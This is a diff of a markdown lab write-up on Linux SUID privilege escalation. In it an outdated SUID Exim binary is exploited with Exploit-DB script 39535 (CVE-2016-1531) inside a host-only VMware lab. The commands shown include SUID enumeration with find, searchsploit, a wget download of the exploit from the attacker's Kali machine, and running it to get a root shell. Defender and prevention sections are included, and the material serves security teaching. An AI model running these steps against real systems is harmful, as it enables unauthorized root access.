@@ -5,7 +5,7 @@
 **Author:** ShahinSecLab <br>
 **Category:** Privilege Escalation <br>
 **Difficulty:** Medium <br>
-**Tools:** SSH, find, searchsploit, wget, chmod
+**Tools:** SSH, searchsploit
 
 # Table of Contents
 
@@ -27,33 +27,37 @@
 
 ## Introduction
 
-SUID (Set User ID) is a special Linux file permission bit. When a binary has the SUID bit set, it runs as the owner of the file — not as the user who launched it. Most SUID binaries on a system are owned by root, which means they run as root regardless of who executes them. If one of those binaries is vulnerable or can be abused, a normal user can use it to get a root shell.
+SUID and SGID are special Linux permissions that allow a program to run with the permissions of the file owner or group.
+
+Many Linux programs use SUID for normal operations. However, if a SUID binary is outdated or has a known vulnerability, a normal user can use it to gain higher privileges.
+
+In this attack, an old Exim binary with the SUID permission enabled was found on the system. The vulnerable binary was exploited using a known exploit, which resulted in getting a root shell.
 
 ## Attack Flow
 ```
 Connected to the target over SSH with low privilege credentials
-                        ↓
+                ↓
 Ran find to locate all SUID binaries on the system
-                        ↓
+                ↓
 Spotted /usr/sbin/exim-4.84-3 as an unusual SUID binary
-                        ↓
+                ↓
 Searched for exploits with searchsploit exim 4.84-3
-                        ↓
+                ↓
 Found CVE-2016-1531 local privilege escalation exploit (39535.sh)
-                        ↓
+                ↓
 Downloaded the exploit to Kali with searchsploit -m 39535
-                        ↓
+                ↓
 Started Python HTTP server on Kali
-                        ↓
+                ↓
 Downloaded the exploit to the target with wget
-                        ↓
+                ↓
 Added execute permission with chmod +x
-                        ↓
+                ↓
 Ran the exploit with ./39535.sh
-                        ↓
+                ↓
 Got a root shell immediately
-                        ↓
-                whoami → root
+                ↓
+      whoami → root
 ```
 
 ## Why This Attack Works
@@ -73,38 +77,40 @@ In either case, since the binary runs as root, whatever it does — including sp
 |------------------|------------------------------------------|
 | Attacker Machine | Kali Linux                               |
 | Victim Machine   | Debian Linux                             |
-| Victim IP        | 192.168.5.133                            |
+| Victim IP        | `192.168.5.133`                            |
 | Access Method    | SSH with valid low-privilege credentials |
 | Network          | VMware Host-Only Network                 |
 
 ## Tools Used
 
-|            Tool          |                Purpose                      |
-|--------------------------|---------------------------------------------|
-| `searchsploit`           | Find known exploits for discovered binaries |
-| `python3 -m http.server` | Host the exploit file for download          |
-| `wget`                   | Download the exploit onto the target        |
+| Tool | Purpose |
+|------|---------|
+| `SSH` | Used to connect to the target machine |
+| `searchsploit` | Used to find an exploit for the vulnerable Exim version |
 
 ## Prerequisites
 
-|             What                         |                       Why                           |
-|------------------------------------------|-----------------------------------------------------|
-| SSH credentials for a low-privilege user | Starting point for the attack                       |
-| `find` command                           | To scan the system for SUID binaries                |
-| `searchsploit` on Kali                   | To find a working exploit for the vulnerable binary |
-| Python HTTP server                       | To host the exploit file for the target to download |
+| What | Why |
+|------|-----|
+| SSH credentials for a low-privilege user | Needed to access the target machine |
+| Access to the command line | Needed to run commands and check files |
+| Connection between Kali and target | Needed to transfer the exploit file |
+| Vulnerable SUID binary | Required to gain root access |
 
 ## Step 1 — Connecting to the Target via SSH
+
+Since the target was running an older SSH setup, I had to add extra flags to allow older key exchange algorithms:
 
 ```bash
 ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.5.133
 ```
 **Breakdown**
 
-- `-o HostKeyAlgorithms=+ssh-rsa` : Allows older RSA host key algorithm — needed for older Linux systems
-- `-o PubkeyAcceptedAlgorithms=+ssh-rsa` : Allows older RSA public key algorithm for authentication
-- `192.168.5.133` : Target IP
-- `user`: User Name
+| Part | Description |
+|------|-------------|
+| `-o HostKeyAlgorithms=+ssh-rsa` | Allows the SSH client to use the older RSA host key algorithm, which is required by some older Linux systems |
+| `-o PubkeyAcceptedAlgorithms=+ssh-rsa` | Allows the SSH client to use the older RSA public key algorithm for authentication |
+| `user@192.168.5.133` | Connects to the target machine as the `user` account at `192.168.5.133` |
 
 **Output:**
 
@@ -139,9 +145,9 @@ I searched the system for files with the SUID bit set using the following comman
 user@debian:~$ find / -type f -perm -4000 2>/dev/null
 ```
 
-**Flag Breakdown**
+**Breakdown**
 
-|  Flag         |            Description                                           |
+|  Part         |            Description                                           |
 |---------------|------------------------------------------------------------------|
 | `find /`      | Starts searching from the root of the filesystem.                |
 | `-type f`     | Searches for files only.                                         |
@@ -202,8 +208,11 @@ Exim < 4.86.2 - Local Privilege Escalation                 | linux/local/39549.t
 Exim < 4.90.1 - 'base64d' Remote Code Execution            | linux/remote/44571.py
 PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution   | php/webapps/42221.py
 ```
-The first result matched what I was looking for: **Exim < 4.86.2 - Local Privilege Escalation** (`linux/local/39535.sh`).
-Since the target was running **Exim 4.84-3**, which is older than **4.86.2**, this exploit was applicable to the target.
+The first result matched the Exim version running on the target:
+```
+Exim 4.84-3 - Local Privilege Escalation (linux/local/39535.sh)
+```
+Since the target was running Exim 4.84-3, the local privilege escalation exploit was applicable.
 
 <p align="center">
   <img src="images/step3-1.png" width="600">
@@ -216,6 +225,14 @@ I downloaded the exploit from the local Exploit Database repository on my Kali m
 ```bash
 searchsploit -m 39535
 ```
+**Breakdown**
+
+| Part | Description |
+|------|-------------|
+| `searchsploit` | Command-line tool used to search and manage exploits from the Exploit Database |
+| `-m` | Option used to copy the exploit file from the local Exploit Database repository |
+| `39535` | Exploit ID of the Exim 4.84-3 Local Privilege Escalation exploit |
+
 **Output:**
 
 ```
@@ -227,7 +244,6 @@ Exploit: Exim 4.84-3 - Local Privilege Escalation
 File Type: POSIX shell script, ASCII text executable
 Copied to: /home/kali/39535.sh
 ```
-The `-m` option copied the exploit from the local Exploit Database repository to my current working directory as `39535.sh`. This made it ready to transfer to the target machine.
 
 <p align="center">
   <img src="images/step3-2.png" width="600">
@@ -253,6 +269,15 @@ On the target machine, I used `wget` to download the exploit from my Kali machin
 ```
 user@debian:~$ wget http://192.168.5.128/39535.sh
 ```
+**Breakdown**
+
+| Part | Description |
+|------|-------------|
+| `wget` | Command-line utility used to download files from a web server |
+| `http://192.168.5.128/39535.sh` | URL of the exploit file hosted on the Kali machine |
+| `192.168.5.128` | IP address of the Kali machine running the HTTP server |
+| `39535.sh` | The exploit script being downloaded to the target machine |
+
 **Output:**
 
 ```
@@ -272,6 +297,8 @@ Saving to: “39535.sh.1”
 
 ### Confirmed the File Was Downloaded
 
+I checked the downloaded file:
+
 ```bash
 user@debian:~$ ls -l 39535.sh
 ```
@@ -287,7 +314,7 @@ user@debian:~$ ls -l 39535.sh
 | `r--`      | Group  | Members of the file's group can only read the file.|
 | `r--`      | Others | All other users can only read the file.            |
 
-The exploit was downloaded successfully, but it did not have execute permission. I needed to make it executable before I could run it.
+The exploit was downloaded successfully, but it did not have execute permission. I needed to add execute permission before running it.
 
 <p align="center">
   <img src="images/step4-3.png" width="600">
@@ -297,11 +324,19 @@ The exploit was downloaded successfully, but it did not have execute permission.
 
 ### Added Execute Permission
 
-Before running the exploit, I made it executable.
+Before running the exploit, I added execute permission to the script.
 
 ```bash
 user@debian:~$ chmod +x 39535.sh
 ```
+**Breakdown**
+
+| Part | Description |
+|------|------------------------------------------|
+| `chmod` | Command used to change file permissions |
+| `+x` | Adds execute permission to the file |
+| `39535.sh` | The exploit script that will be executed |
+
 ### Confirmed the Permission Change
 
 ```bash
@@ -310,7 +345,7 @@ user@debian:~$ ls -l 39535.sh
 ```
 -rwxr-xr-x 1 user user 638 Jul  4 06:17 39535.sh
 ```
-The execute bit was now set, so the script was ready to run.
+The execute permission was added successfully, and the script was ready to run.
 
 <p align="center">
   <img src="images/step5-1.png" width="600">
@@ -327,7 +362,7 @@ user@debian:~$ ./39535.sh
 [ CVE-2016-1531 local root exploit
 sh-4.1#
 ```
-The exploit completed successfully and dropped me into a root shell.
+The exploit completed successfully, and the prompt changed from `user@debian` to `sh-4.1#`. The `#` symbol indicates that the shell was running with root privileges.
 
 <p align="center">
   <img src="images/step5-2.png" width="600">
@@ -335,17 +370,25 @@ The exploit completed successfully and dropped me into a root shell.
 
 ### Confirmed Root Access
 
+I verified the current user with `whoami`:
+
 ```bash
 sh-4.1# whoami
 ```
+**Output:**
+
 ```
 root
 ```
+I also checked the user ID:
+
 ```bash
 sh-4.1# id
 ```
+**Output:**
+
 ```
-uid=0(root) gid=1000(user) groups=0(root)
+uid=0(root) gid=0(root) groups=0(root)
 ```
 The `whoami` and `id` commands confirmed that I had successfully gained root privileges by exploiting the vulnerable SUID Exim binary (CVE-2016-1531).
 
@@ -355,13 +398,13 @@ The `whoami` and `id` commands confirmed that I had successfully gained root pri
 
 ## How Defenders Can Catch This
 
-|                     Indicator                            |            What to Look For                   |
-|----------------------------------------------------------|-----------------------------------------------|
-| Unusual SUID binaries on the system                      | Regular SUID audits                           |
-| Exploit script downloaded using `wget` or `curl`         | Network monitoring and process logs           |
-| Unexpected root shell spawned from a normal user session | Audit logs (for example, `/var/log/auth.log`) |
-| Outdated software with known CVEs                        | Regular vulnerability scans                   |
-| `chmod` run on a newly downloaded script                 | File activity monitoring                      |
+| Indicator | What to look for |
+|-----------|------------------|
+| Unknown SUID binaries | Check SUID files regularly |
+| Old software versions | Keep systems updated |
+| Exploit files downloaded to the server | Monitor file and network activity |
+| Unusual commands run by normal users | Check command and process logs |
+| Root shell from a normal user account | Review authentication logs |
 
 ## How to Prevent It
 
@@ -398,20 +441,21 @@ If the target machine could not reach my Kali HTTP server, the exploit download 
 
 ## References
 
-- Exploit Database — CVE-2016-1531 : https://www.exploit-db.com/exploits/39535 
-- CVE Details — CVE-2016-1531 : https://www.cvedetails.com/cve/CVE-2016-1531 
-- GTFOBins : https://gtfobins.github.io 
-- MITRE ATT&CK — SUID and SGID : https://attack.mitre.org/techniques/T1548/001
-- HackTricks — SUID Privilege Escalation : https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#suid-and-sgid 
-- PayloadsAllTheThings — SUID : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#suid 
+| Resource | Link |
+|----------|------|
+| Exploit Database — CVE-2016-1531 | https://www.exploit-db.com/exploits/39535 |
+| CVE Details — CVE-2016-1531 | https://www.cvedetails.com/cve/CVE-2016-1531 |
+| GTFOBins | https://gtfobins.github.io |
+| MITRE ATT&CK — SUID and SGID | https://attack.mitre.org/techniques/T1548/001 |
+| HackTricks — SUID Privilege Escalation | https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#suid-and-sgid |
+| PayloadsAllTheThings — SUID | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#suid |
 
 ## Lessons Learned
 
-While working through this attack I realized that:
-
-- Finding SUID binaries should be one of the first things checked on any Linux machine after getting initial access
-- Most SUID binaries on a system are there for legitimate reasons — the key is spotting the ones that are unusual or outdated
-- exim-4.84-3 stood out straight away because it is a mail server binary and does not need to be SUID in most environments
-- Searchsploit made finding the right exploit fast — I just copied the version number and searched
-- The exploit worked straight out of the box without any modifications needed
+- SUID binaries should be checked regularly because they can lead to root access.
+- Unknown or unnecessary SUID files should be investigated.
+- Keeping software updated helps prevent known vulnerabilities.
+- Removing unnecessary SUID permissions makes the system safer.
+- A vulnerable SUID binary can allow a normal user to become root.
+- Regular system checks can help find dangerous configurations early.
 
